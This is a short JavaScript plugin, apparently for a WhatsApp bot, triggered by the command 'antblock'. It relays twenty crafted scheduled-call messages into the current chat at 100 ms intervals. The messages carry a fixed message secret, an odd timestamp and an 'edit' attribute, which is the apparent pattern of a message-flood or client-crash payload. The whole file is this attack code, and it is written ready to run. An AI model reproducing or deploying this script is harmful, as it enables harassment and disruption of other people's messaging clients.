const delay = ms => new Promise(resolve => setTimeout(resolve, ms))

let handler = async (m, { conn }) => {

  const cantidad = 20;
  const from = m.chat;

  for (let i = 0; i < cantidad; i++) {
    await conn.relayMessage(from, {
      messageContextInfo: {
        messageSecret: "eed1zxI49cxiovBTUFLIEWi1shD9HgIOghONuqPDGTk=",
        deviceListMetaData: {},
        deviceListMetadataVersion: 2
      },
      scheduledCallCreationMessage: {
        scheduledTimestampMs: '1200',
        callType: "AUDIO",
        title: '👻',
      }
    }, {
      additionalAttributes: {
        edit: '7'
      }
    });

    await delay(100);
  }
};

handler.command = ['antblock'];
handler.owner = false;
handler.bot = false;

export default handler;
